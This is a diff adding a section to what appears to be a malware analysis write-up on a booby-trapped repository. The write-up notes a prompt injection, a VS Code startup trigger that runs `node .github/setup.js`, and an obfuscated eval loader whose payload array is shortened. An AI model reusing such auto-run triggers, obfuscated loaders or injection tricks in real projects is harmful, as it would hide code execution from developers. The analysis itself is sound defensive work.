@@ -78,3 +78,11 @@ This certainly seems like a [prompt injection](https://en.wikipedia.org/wiki/Pro
 
 This seems to be a deterministic trigger that runs when [vscode](https://code.visualstudio.com) starts, and does the same thing as the others.  
 At this point, we know `node .github/setup.js` is the intended payload.
+
+## First payload
+The first payload is quite a big JavaScript file that would run under [node](https://nodejs.org). Since it's quite big, I have simply uploaded here under [setup.js.txt]. In essence, it looks like this:
+```js
+ry{eval(function(s,n){return s.replace(/[a-zA-Z]/g,function(c){var b=c<="Z"?65:97;return String.fromCharCode((c.charCodeAt(0)-b+n)%26+b)})}([40,119,111,117,106,121,40,...,125,41,40,41].map(function(c){return String.fromCharCode(c)}).join(""),4))}catch(e){console.log("wrapper:",e.message||e)}
+```
+
+The numerical huge array (which I shortened here) is the payload.
